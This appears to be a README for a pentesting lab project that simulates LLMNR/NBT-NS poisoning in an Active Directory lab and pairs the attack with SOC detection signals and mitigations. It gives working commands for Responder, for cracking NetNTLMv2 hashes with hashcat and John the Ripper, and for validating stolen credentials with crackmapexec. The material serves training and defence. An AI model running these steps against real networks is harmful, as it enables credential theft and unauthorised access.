LLMNR/NBT-NS Poisoning Attack Simulation in Active Directory Lab

**Overview**
This project demonstrates how LLMNR/NBT-NS name resolution poisoning can be used to capture NTLM authentication hashes in a controlled Active Directory lab environment.

The goal is to understand how legacy Windows protocols can be abused and how SOC teams can detect and mitigate such attacks.

**Disclaimer** Educational use only. All testing performed in an isolated lab environment.


Lab Setup

| Component | Description |
|----------|------------|
| Attacker | Kali Linux (VMware) |
| Victim | Windows VM (Domain-joined) |
| Network | NAT (same subnet) |
| Tools | Responder, Hashcat, John the Ripper, CrackMapExec |



**Attack Simulation Steps**

Attack Workflow

Step1: Configure Responder

Edit the configuration file:

```bash
sudo nano /usr/share/responder/Responder.conf
```

Ensure the following modules are enabled:

```ini
[Responder Core]
SQL = On
SMB = On
HTTP = On
HTTPS = On
LDAP = On

Step2: Start Responder
```bash
sudo responder -I eth0 -dwv

Step3: Trigger LLMNR Request (Victim)

On Windows machine:
\\fakeshare

This forces LLMNR/NBT-NS broadcast resolution.

Step4: Capture NTLM Hash

Responder intercepts authentication attempts:

Username
Domain
NetNTLMv2 hash

Logs stored in:

/usr/share/responder/logs/

Step5: Crack Hash

John the Ripper

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

OR 

Hashcat

hashcat -m 5600 hash.txt rockyou.txt

Step6: Validate Credentials
crackmapexec smb <target-ip> -u <user> -p <password> --shares



Evidence

Screenshots and logs included in /screenshots:

LLMNR trigger
Responder capture output
SMB authentication attempt
Cracked credentials

SOC Detection Mapping:

**Stage**	             **Detection Signal**
LLMNR Request	             UDP 5355 broadcast traffic
Poisoning Activity	     Rogue name resolution responses
Credential Capture	     NTLM authentication attempts

**Mitigations**
Disable LLMNR via Group Policy
Disable NetBIOS over TCP/IP
Enforce SMB signing
Use strong password policies
Monitor NTLM authentication traffic


**Key Takeaways**
LLMNR is a legacy protocol vulnerable to abuse
NTLM authentication can be intercepted in misconfigured environments
Disabling LLMNR significantly reduces attack surface


Author

Eduke, Emmanuel — SOC / Pentesting AD Lab Project

